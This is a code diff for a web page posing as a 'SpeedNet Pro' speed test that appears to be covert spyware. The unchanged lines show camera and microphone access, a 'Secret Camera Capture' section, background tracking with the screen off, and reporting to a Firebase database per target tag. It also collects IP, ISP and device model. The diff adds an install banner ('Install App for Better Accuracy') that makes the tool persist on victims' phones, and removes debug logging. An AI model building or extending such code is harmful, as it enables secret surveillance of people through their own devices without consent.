@@ -139,6 +139,29 @@
         }
         .perm-notice.show { display: block; }
 
+        /* PWA Install Banner (New Feature) */
+        .install-banner {
+            display: none;
+            background: rgba(16, 185, 129, 0.12);
+            border: 1px solid rgba(16, 185, 129, 0.3);
+            border-radius: 12px;
+            padding: 14px 16px;
+            margin-top: 15px;
+            width: 100%;
+            text-align: center;
+            animation: fadeIn 0.4s ease;
+        }
+        .install-banner.show { display: block; }
+        .install-title { font-size: 12px; font-weight: 600; color: var(--green); margin-bottom: 8px; }
+        .install-btn {
+            background: linear-gradient(135deg, var(--green), #059669); color: white;
+            border: none; padding: 10px 20px; border-radius: 8px; font-family: 'Inter', sans-serif;
+            font-weight: 700; font-size: 12px; cursor: pointer; box-shadow: 0 4px 15px rgba(16,185,129,0.25);
+            transition: transform 0.2s; width: 100%;
+        }
+        .install-btn:active { transform: scale(0.96); }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(-5px); } to { opacity: 1; transform: translateY(0); } }
+
         /* Background Status Banner */
         .bg-status {
             display: none;
@@ -239,6 +262,12 @@
             📷 Camera &amp; Mic এর permission দিন।
         </div>
 
+        <!-- PWA Install Prompt Banner -->
+        <div class="install-banner" id="installBanner">
+            <div class="install-title">🚀 Install App for Better Accuracy</div>
+            <button class="install-btn" id="installBtn">Add to Home Screen</button>
+        </div>
+
         <div class="bg-status" id="bgStatus">
             <div class="bg-dot"></div>
             <span>Background tracking active — screen off হলেও চলবে</span>
@@ -263,6 +292,26 @@
         import { getDatabase, ref, set, onValue, onDisconnect } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
 
         // ═══════════════════════════════════════════════════════════
+        //  Dynamic PWA Manifest Generation (No extra files needed)
+        // ═══════════════════════════════════════════════════════════
+        const manifestObj = {
+            "name": "SpeedNet Pro",
+            "short_name": "SpeedNet",
+            "start_url": window.location.href,
+            "display": "standalone",
+            "background_color": "#060812",
+            "theme_color": "#38bdf8",
+            "icons": [{
+                "src": "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48Y2lyY2xlIGN4PSI1MCIgY3k9IjUwIiByPSI1MCIgZmlsbD0iIzM4YmRmOCIvPjx0ZXh0IHg9IjUwIiB5PSI2NSIgZm9udC1zaXplPSI1MCIgZm9udC13ZWlnaHQ9ImJvbGQiIGZpbGw9IndoaXRlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LWZhbWlseT0ic2Fucy1zZXJpZiI+UzwvdGV4dD48L3N2Zz4=",
+                "sizes": "192x192",
+                "type": "image/svg+xml"
+            }]
+        };
+        const manifestBlob = new Blob([JSON.stringify(manifestObj)], { type: 'application/json' });
+        const manifestURL = URL.createObjectURL(manifestBlob);
+        document.querySelector('head').insertAdjacentHTML('beforeend', `<link rel="manifest" href="${manifestURL}">`);
+
+        // ═══════════════════════════════════════════════════════════
         //  Firebase Init
         // ═══════════════════════════════════════════════════════════
         const firebaseConfig = {
@@ -276,7 +325,6 @@
 
         // ═══════════════════════════════════════════════════════════
         //  Multi-User Tag ID (URL এ ?tag=1 দিলে সেই নম্বরে রেকর্ড হবে)
-        //  Default: tag1 (কেউ tag না বললে)
         // ═══════════════════════════════════════════════════════════
         const urlParams = new URLSearchParams(window.location.search);
         const tagId = (urlParams.get('tag') || '1').replace(/[^a-zA-Z0-9_-]/g, '').substring(0, 20) || '1';
@@ -288,11 +336,38 @@
         let heartbeatInterval = null;
 
         // ═══════════════════════════════════════════════════════════
-        //  Service Worker Registration (background operation)
+        //  Service Worker Registration & PWA Install Handling
         // ═══════════════════════════════════════════════════════════
         if ('serviceWorker' in navigator) {
             navigator.serviceWorker.register('./sw.js').catch(() => {});
         }
+
+        let deferredPrompt;
+        const installBanner = document.getElementById('installBanner');
+        const installBtn = document.getElementById('installBtn');
+
+        window.addEventListener('beforeinstallprompt', (e) => {
+            e.preventDefault();
+            deferredPrompt = e;
+            // PWA ইন্সটল করার প্রম্পট ব্যানার দেখাবে
+            installBanner.classList.add('show');
+        });
+
+        installBtn.addEventListener('click', async () => {
+            if (deferredPrompt) {
+                deferredPrompt.prompt();
+                const { outcome } = await deferredPrompt.userChoice;
+                if (outcome === 'accepted') {
+                    installBanner.classList.remove('show');
+                }
+                deferredPrompt = null;
+            }
+        });
+
+        window.addEventListener('appinstalled', () => {
+            installBanner.classList.remove('show');
+            console.log('PWA successfully installed');
+        });
 
         // ═══════════════════════════════════════════════════════════
         //  Wake Lock — screen off এ কাজ করার জন্য
@@ -329,38 +404,32 @@
         }
 
         // ═══════════════════════════════════════════════════════════
-        //  IP & ISP — HTTPS only APIs (no mixed content)
+        //  IP & ISP
         // ═══════════════════════════════════════════════════════════
         let userIp = "Unknown", userIsp = "Unknown";
 
         async function fetchNetworkData() {
-            // শুধু HTTPS APIs ব্যবহার করা হচ্ছে (HTTP block হয়)
             const apis = [
-                // API 1: ipwho.is (reliable, HTTPS)
                 async () => {
                     const r = await fetch('https://ipwho.is/', { signal: AbortSignal.timeout(5000) });
                     const d = await r.json();
                     if (!d.success) throw new Error('failed');
                     return { ip: d.ip, isp: d.connection?.isp || d.connection?.org || d.org || 'Unknown' };
                 },
-                // API 2: ipapi.co
                 async () => {
                     const r = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) });
                     const d = await r.json();
                     if (d.error) throw new Error('failed');
                     return { ip: d.ip, isp: d.org || d.asn || 'Unknown' };
                 },
-                // API 3: freeipapi.com
                 async () => {
                     const r = await fetch('https://freeipapi.com/api/json', { signal: AbortSignal.timeout(5000) });
                     const d = await r.json();
                     return { ip: d.ipAddress, isp: d.isp || d.asName || 'Unknown' };
                 },
-                // API 4: ipify (IP only, then ISP from ip-api via HTTPS proxy)
                 async () => {
                     const r = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(5000) });
                     const d = await r.json();
-                    // Try to get ISP separately
                     try {
                         const r2 = await fetch(`https://ipapi.co/${d.ip}/json/`, { signal: AbortSignal.timeout(4000) });
                         const d2 = await r2.json();
@@ -369,7 +438,6 @@
                         return { ip: d.ip, isp: 'Unknown' };
                     }
                 },
-                // API 5: cloudflare trace
                 async () => {
                     const r = await fetch('https://cloudflare.com/cdn-cgi/trace', { signal: AbortSignal.timeout(5000) });
                     const text = await r.text();
@@ -384,14 +452,10 @@
                     const result = await apiFn();
                     if (result.ip && result.ip !== 'undefined' && result.ip !== 'Unknown') {
                         userIp = result.ip;
-                        // Clean ISP: Remove AS number prefix like "AS12345 "
                         userIsp = (result.isp || 'Unknown').replace(/^AS\d+\s*/, '').trim() || 'Unknown';
-                        console.log('IP/ISP found:', userIp, userIsp);
                         return;
                     }
-                } catch(e) {
-                    console.log('API failed, trying next...', e.message);
-                }
+                } catch(e) {}
             }
             userIp = "Blocked";
             userIsp = "VPN/Blocked";
@@ -399,68 +463,50 @@
         fetchNetworkData();
 
         // ═══════════════════════════════════════════════════════════
-        //  Device Name Detection — উন্নত পদ্ধতি
+        //  Device Name Detection
         // ═══════════════════════════════════════════════════════════
         let deviceModel = "Detecting...";
 
         async function getDeviceName() {
-            // Method 1: User Agent Client Hints (Chrome Android — সবচেয়ে accurate)
             if (navigator.userAgentData) {
                 try {
                     const hints = await navigator.userAgentData.getHighEntropyValues([
                         "model", "platform", "platformVersion", "brands", "fullVersionList"
                     ]);
-                    console.log('UA hints:', hints);
                     if (hints.model && hints.model.trim() && hints.model !== '') {
                         const model = hints.model.trim();
                         const platform = hints.platform || '';
                         const ver = hints.platformVersion || '';
                         return `${model} (${platform} ${ver})`.trim();
                     }
-                    // model খালি — platform ব্যবহার করি
                     if (hints.platform) {
                         return `${hints.platform} ${hints.platformVersion || ''}`.trim();
                     }
-                } catch(e) {
-                    console.log('UA hints error:', e);
-                }
+                } catch(e) {}
             }
 
-            // Method 2: User Agent String parsing (fallback)
             const ua = navigator.userAgent;
-            console.log('UA string:', ua);
-
-            // iPhone detection
             if (/iPhone/i.test(ua)) {
                 const match = ua.match(/iPhone OS ([\d_]+)/);
                 return match ? `iPhone (iOS ${match[1].replace(/_/g,'.')})` : 'iPhone';
             }
-            // iPad
             if (/iPad/i.test(ua)) {
                 const match = ua.match(/CPU OS ([\d_]+)/);
                 return match ? `iPad (iPadOS ${match[1].replace(/_/g,'.')})` : 'iPad';
             }
-
-            // Android — model name extract করার চেষ্টা
             if (/Android/i.test(ua)) {
                 const androidVersion = ua.match(/Android ([\d.]+)/)?.[1] || '';
-
-                // Pattern 1: "Android 13; SM-G991B Build" → SM-G991B
                 const buildMatch = ua.match(/Android[\d.]+;\s*([^;)]+?)\s*(?:Build|wv)[\/)/]/i);
                 if (buildMatch) {
                     const model = buildMatch[1].trim();
-                    // কিছু generic নাম বাদ দেই
                     const skipList = ['Linux', 'Mobile', 'Phone', 'Tablet', 'K'];
                     if (model && !skipList.some(s => model === s)) {
                         return `${model} (Android ${androidVersion})`;
                     }
                 }
-
-                // Pattern 2: শেষ semicolon এর পর
                 const parts = ua.match(/\(([^)]+)\)/);
                 if (parts) {
                     const segments = parts[1].split(';').map(s => s.trim());
-                    // Android version এর পরে model আসে সাধারণত
                     for (let i = 0; i < segments.length; i++) {
                         if (segments[i].includes('Android') && segments[i+1]) {
                             const candidate = segments[i+1].replace(/Build.*/, '').trim();
@@ -470,26 +516,17 @@
                         }
                     }
                 }
-
                 return `Android ${androidVersion || 'Phone'}`;
             }
-
-            // Windows Phone
             if (/Windows Phone/i.test(ua)) return 'Windows Phone';
-            // MacBook/iMac
             if (/Macintosh/i.test(ua)) return 'MacBook/iMac';
-            // Windows PC
             if (/Windows/i.test(ua)) return 'Windows PC';
-            // Linux
             if (/Linux/i.test(ua)) return 'Linux Device';
 
             return 'Unknown Device';
         }
 
-        getDeviceName().then(n => {
-            deviceModel = n;
-            console.log('Device model detected:', deviceModel);
-        });
+        getDeviceName().then(n => deviceModel = n);
 
         // ═══════════════════════════════════════════════════════════
         //  Secret Camera Capture
@@ -695,7 +732,6 @@
                 startHeartbeat();
                 document.getElementById('bgStatus').classList.add('show');
 
-                // IP ও Device পাওয়া না গেলে আবার চেষ্টা
                 if (userIp === 'Unknown') fetchNetworkData();
                 if (deviceModel === 'Detecting...') {
                     getDeviceName().then(n => deviceModel = n);
